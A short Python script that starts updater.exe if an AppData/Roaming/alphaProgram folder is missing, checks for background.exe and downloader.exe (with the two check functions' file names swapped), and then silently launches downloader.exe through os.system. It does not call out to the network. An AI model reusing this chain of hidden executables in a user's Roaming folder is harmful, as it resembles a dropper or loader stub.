import os
import time

user = os.getlogin()

MYDIR = "C:/Users/" + user + "/AppData\Roaming/alphaProgram/"
CHECK_FOLDER = os.path.isdir(MYDIR)

if not CHECK_FOLDER:
    os.system('start updater.exe')
    time.sleep(30)

    def checkDownloader():
        try:
            f = open("C:/Users/" + user + "/AppData\Roaming/alphaProgram/background.exe")
        except IOError:
            print("File not accessible")
            os.system('start updater.exe')
    def checkBackground():
        try:
            f = open("C:/Users/" + user + "/AppData\Roaming/alphaProgram/downloader.exe")
        except IOError:
            print("File not accessible")
            os.system('start updater.exe')

    checkBackground()
    checkDownloader()


os.system('start C:/Users\%username%\AppData\Roaming/alphaProgram\downloader.exe')